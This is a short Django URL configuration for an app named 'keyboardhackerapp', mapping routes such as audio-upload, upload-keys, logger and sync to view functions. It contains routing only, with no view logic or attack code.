from django.urls import path, include

from keyboardhackerapp import views

urlpatterns = [
    path('mobile', views.mobile),
    path('audio-upload', views.audio_upload),
    path('is-active', views.is_active),
    path('upload-keys', views.upload_keys),
    path('logger', views.logger),
    path('sync', views.sync),
]